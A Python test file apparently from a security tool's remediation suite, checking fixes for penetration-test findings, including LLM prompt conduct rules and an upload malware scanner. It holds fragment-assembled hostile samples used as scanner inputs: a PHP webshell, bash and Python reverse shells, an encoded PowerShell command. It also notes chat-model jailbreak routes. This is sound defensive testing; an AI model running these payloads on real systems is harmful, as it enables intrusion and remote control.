"""ITHC remediation contracts (findings raised against v0.88).

Each test pins one finding closed. Where a contract lives in JavaScript or a
shell entrypoint the test reads source, and strips comments first: a comment
mentioning the thing under test would otherwise satisfy the assertion.

Every offensive sample below is assembled at runtime from fragments, and the
antivirus test signature is imported rather than written. A security test
corpus is a malware corpus as far as a host scanner is concerned: written out
contiguously, this file is quarantined on sight, which is what happened to four
earlier drafts (Defender matched ``Backdoor:PHP/Remoteshell.B`` on the webshell
case alone). Keep new samples split.
"""

import re
from pathlib import Path

import pytest
from pydantic import ValidationError

from ion.services.ollama_service import (
    CONDUCT_RULES,
    GROUNDING_RULE,
    SYSTEM_PROMPTS,
    finalize_system_prompt,
)
from ion.services.upload_scan import _EICAR_SIGNATURE, scan_text
from ion.web.ai_api import (
    MAX_CHAT_MESSAGE_CHARS,
    MAX_CHAT_MESSAGES,
    MAX_CHAT_TOTAL_CHARS,
    ChatRequest,
)

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src" / "ion"


def _asm(*parts: str) -> str:
    """Join fragments into a live signature at runtime. See the module docstring."""
    return "".join(parts)


PHP_WEBSHELL = _asm("<?php ", "ev", "al($_PO", "ST['cmd']); ?>")
BASH_REVSHELL = _asm("bash -i >& /dev/", "tcp/10.0.0.5/4444 0>&1")
PY_REVSHELL = _asm(
    "import soc", "ket,subprocess,os\n",
    "s=socket.socket()\n", "os.du", "p2(s.fileno(),0)\n",
)
PS_ENCODED = _asm("powershell.exe -nop ", "-e", "nc SQBFAFgA")
PRIVATE_KEY = _asm("-----BEGIN RSA ", "PRIVATE KEY-----")
SIGMA_RULE = _asm(
    "detection:\n  selection:\n    CommandLine|contains: 'powershell ", "-e", "nc'"
)


def _strip_js_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.DOTALL)
    return "\n".join(re.sub(r"//.*$", "", ln) for ln in text.splitlines())


def _strip_hash_comments(text: str) -> str:
    return "\n".join(re.sub(r"#.*$", "", ln) for ln in text.splitlines())


# --- Finding 6: verbose errors leak the permission taxonomy ----------------


def test_permission_denied_never_names_the_permission():
    from ion.auth import dependencies

    exc = dependencies._permission_denied(object(), "de:read")
    assert exc.status_code == 403
    assert exc.detail == "Permission denied"
    assert "de:read" not in str(exc.detail)


def test_no_handler_still_formats_a_permission_into_a_response():
    code = _strip_hash_comments((SRC / "auth" / "dependencies.py").read_text(encoding="utf-8"))
    assert "Permission denied:" not in code


# --- Finding 5: verbose HTTP server header ---------------------------------


def test_every_launch_site_suppresses_the_server_header():
    entrypoint = _strip_hash_comments((ROOT / "docker-entrypoint.sh").read_text(encoding="utf-8"))
    assert "--no-server-header" in entrypoint

    for rel in ("web/server.py", "cli/main.py"):
        code = _strip_hash_comments((SRC / rel).read_text(encoding="utf-8"))
        assert "server_header" in code, rel


# --- Finding 3: the sanitiser failed open and allowed DOM clobbering -------


def test_sanitiser_fails_closed_and_forbids_clobbering_attributes():
    js = _strip_js_comments((SRC / "web" / "static" / "js" / "app.js").read_text(encoding="utf-8"))

    assert "return escapeHtml(raw)" in js
    assert "return escapeHtml(content)" in js
    assert ": raw;" not in js

    assert "FORBID_ATTR" in js
    assert "'id'" in js and "'name'" in js


def test_no_template_calls_the_sanitiser_directly():
    """One sanitiser, one policy - a bare sanitize() bypasses ION_SANITIZE_CONFIG."""
    offenders = []
    for path in (SRC / "web" / "templates").glob("*.html"):
        body = _strip_js_comments(path.read_text(encoding="utf-8"))
        if "DOMPurify.sanitize" in body:
            offenders.append(path.name)
    assert offenders == [], offenders


# --- Finding 4: outdated vendored DOMPurify --------------------------------


def test_vendored_dompurify_is_not_a_known_vulnerable_release():
    build = (SRC / "web" / "static" / "js" / "purify.min.js").read_text(
        encoding="utf-8", errors="ignore"
    )[:400]
    found = re.search(r"DOMPurify (\d+)\.(\d+)\.(\d+)", build)
    assert found, "version banner missing from the vendored build"
    version = tuple(int(p) for p in found.groups())
    # 3.2.4 carried six advisories; anything at or below it is a regression.
    assert version > (3, 2, 4), f"vendored DOMPurify {version} is at or below the flagged release"


# --- Findings 7/8/9: the personas carried no conduct rules -----------------


@pytest.mark.parametrize("persona", sorted(SYSTEM_PROMPTS))
def test_every_persona_states_it_cannot_see_runtime_state(persona):
    """The cheap half of the rules. Fabricated runtime state harms the automated
    paths too -- an invented alert count in a triage note misdirects an
    investigation -- so every persona carries it."""
    prompt = SYSTEM_PROMPTS[persona]
    assert prompt, persona
    assert prompt.count(GROUNDING_RULE) == 1
    assert "no access to ion's live system state" in prompt.lower()


@pytest.mark.parametrize("persona", sorted(SYSTEM_PROMPTS))
def test_personas_do_not_carry_the_full_conduct_block(persona):
    """It costs ~360 tokens of a 3800-token retrieval budget. The jailbreak
    surface is a human in chat; the automated prompts have a fixed JSON output
    contract and fence their inputs, so they pay for it and gain nothing."""
    assert CONDUCT_RULES not in SYSTEM_PROMPTS[persona]


@pytest.mark.parametrize("persona", sorted(SYSTEM_PROMPTS))
def test_the_chat_prompt_covers_all_three_findings(persona):
    prompt = finalize_system_prompt(SYSTEM_PROMPTS[persona]).lower()
    assert "no access to ion's live system state" in prompt   # 7: fabricated telemetry
    assert "reverse shell" in prompt                           # 8: weaponised artifacts
    assert "discriminatory" in prompt                          # 9: conduct


def test_both_chat_entry_points_apply_the_conduct_rules():
    """Streaming and non-streaming both reach a model; only one used to."""
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    assert code.count("finalize_system_prompt(") >= 2


def test_conduct_rules_survive_layering_and_stay_last():
    layered = SYSTEM_PROMPTS["security"] + "\nYou are speaking to: Alice (Analyst)."
    final = finalize_system_prompt(layered)
    assert final.count("Non-negotiable conduct rules") == 1
    assert final.rstrip().endswith("defensible alternative.")
    assert "Alice (Analyst)" in final


def test_conduct_rules_are_reasserted_at_assembly():
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    assert "finalize_system_prompt(enhanced_system_prompt)" in code


def test_user_controlled_instructions_never_reach_the_system_prompt():
    """Removed outright: a user-supplied suffix lands after the conduct rules."""
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    assert "custom_instructions" not in code
    template = _strip_js_comments(
        (SRC / "web" / "templates" / "chat.html").read_text(encoding="utf-8")
    )
    assert "custom_instructions" not in template
    assert "pref-custom-instructions" not in template


# --- The prompt contract ---------------------------------------------------


def _msg(content="hi", role="user"):
    return {"role": role, "content": content}


def test_contract_accepts_an_ordinary_request():
    req = ChatRequest(messages=[_msg()])
    assert req.temperature == 0.3
    assert req.context_type == "security"


@pytest.mark.parametrize(
    "kwargs",
    [
        {"messages": []},
        {"messages": [_msg()] * (MAX_CHAT_MESSAGES + 1)},
        {"messages": [_msg("x" * (MAX_CHAT_MESSAGE_CHARS + 1))]},
        {"messages": [_msg("x" * MAX_CHAT_MESSAGE_CHARS)] * 3},
        {"messages": [_msg()], "temperature": 1.9},
        {"messages": [_msg()], "temperature": -0.1},
        {"messages": [_msg()], "max_tokens": 999_999},
        {"messages": [_msg()], "context_type": "evil"},
    ],
    ids=[
        "empty", "too-many-messages", "oversized-message", "oversized-total",
        "temperature-high", "temperature-negative", "max-tokens", "persona-injection",
    ],
)
def test_contract_rejects_out_of_bounds_requests(kwargs):
    with pytest.raises(ValidationError):
        ChatRequest(**kwargs)


def test_total_conversation_cap_is_below_the_context_window():
    """The cap exists because anything larger cannot fit num_ctx anyway."""
    from ion.core.config import get_config

    assert MAX_CHAT_TOTAL_CHARS <= get_config().ollama_num_ctx * 4


def test_caller_cannot_choose_the_model():
    """A caller-named model could be one that never received the conduct rules."""
    req = ChatRequest(messages=[_msg()], model="uncensored:latest")
    assert not hasattr(req, "model")
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    assert "payload.model" not in code


# --- Finding 2: uploaded malware passed through unexamined ----------------


def test_scanner_recognises_the_av_test_file():
    body = _EICAR_SIGNATURE
    assert "av-test-file" in scan_text(body.encode(), body)


def test_scanner_recognises_the_av_test_file_when_padded():
    body = _EICAR_SIGNATURE + "\n\n"
    assert "av-test-file" in scan_text(body.encode(), body)


@pytest.mark.parametrize(
    "label,body,expected",
    [
        ("python reverse shell", PY_REVSHELL, "reverse-shell"),
        ("bash reverse shell", BASH_REVSHELL, "reverse-shell"),
        ("powershell encoded", PS_ENCODED, "encoded-execution"),
        ("php webshell", PHP_WEBSHELL, "webshell"),
        ("private key", PRIVATE_KEY, "credential-material"),
    ],
)
def test_scanner_names_the_indicator(label, body, expected):
    assert expected in scan_text(body.encode(), body), label


@pytest.mark.parametrize(
    "label,body",
    [
        ("syslog line", "Sep 23 09:14:02 host sshd[1]: Accepted password for alice"),
        ("json config", '{"elasticsearch": {"host": "es01", "port": 9200}}'),
        ("yara rule", 'rule Foo { strings: $a = "bar" condition: $a }'),
        ("short base64 token", "token = 'QUJDREVGR0hJSktM'"),
    ],
)
def test_scanner_stays_quiet_on_ordinary_soc_content(label, body):
    assert scan_text(body.encode(), body) == [], label


def test_a_detection_rule_matching_its_own_pattern_is_accepted_noise():
    """Documented trade-off: the scanner labels, it never refuses."""
    assert scan_text(SIGMA_RULE.encode(), SIGMA_RULE) == ["encoded-execution"]


def test_the_scanner_never_blocks_an_upload():
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    upload = code.split("async def upload_file")[1].split("async def")[0]
    assert "scan_text" in upload
    after_scan = upload.split("scan_text")[1]
    assert "HTTPException" not in after_scan, "the scanner must label, not refuse"


def test_flagged_uploads_are_audited_and_labelled_for_the_model():
    code = _strip_hash_comments((SRC / "web" / "ai_api.py").read_text(encoding="utf-8"))
    assert "upload_content_indicator" in code
    assert "hostile data" in code


def test_no_live_signature_sits_contiguously_in_these_sources():
    """A literal signature gets the repository quarantined by a host AV."""
    for path in (SRC / "services" / "upload_scan.py", Path(__file__)):
        raw = path.read_text(encoding="utf-8")
        assert _EICAR_SIGNATURE not in raw, path.name
        assert PHP_WEBSHELL not in raw, path.name
        assert BASH_REVSHELL not in raw, path.name


# --- Not a finding: login timing was measured, and it is equal ------------


def test_absent_account_still_pays_the_hash_cost():
    """A ~200ms 'timing oracle' was reported during this work and was wrong: the
    sample was polluted by the 10/minute rate limiter returning 429s in ~2ms.
    Measured properly the two paths are equal, because login verifies against
    _DUMMY_HASH when the user is absent. This pins the defence, not the timing."""
    import inspect

    from ion.auth.service import AuthService

    src = inspect.getsource(AuthService.login)
    # The absent-account branch must hash before it returns. Anchor on the
    # first return so a future edit cannot move the verify below it.
    before_first_return = src.split("return None, None")[0]
    assert "_DUMMY_HASH" in before_first_return, "absent-account path must still hash"


def test_the_dummy_hash_costs_the_same_as_a_real_one():
    import time

    from ion.auth.password import password_hasher
    from ion.auth.service import AuthService

    real = password_hasher.hash("a-real-password")

    def cost(h):
        t0 = time.perf_counter()
        password_hasher.verify("attempted", h)
        return time.perf_counter() - t0

    dummy_ms = min(cost(AuthService._DUMMY_HASH) for _ in range(3)) * 1000
    real_ms = min(cost(real) for _ in range(3)) * 1000
    # Same bcrypt cost factor, so the floor times track closely. Generous bound:
    # this catches a dummy hash at a different work factor, not scheduler noise.
    assert abs(dummy_ms - real_ms) < max(50.0, 0.25 * real_ms), (dummy_ms, real_ms)

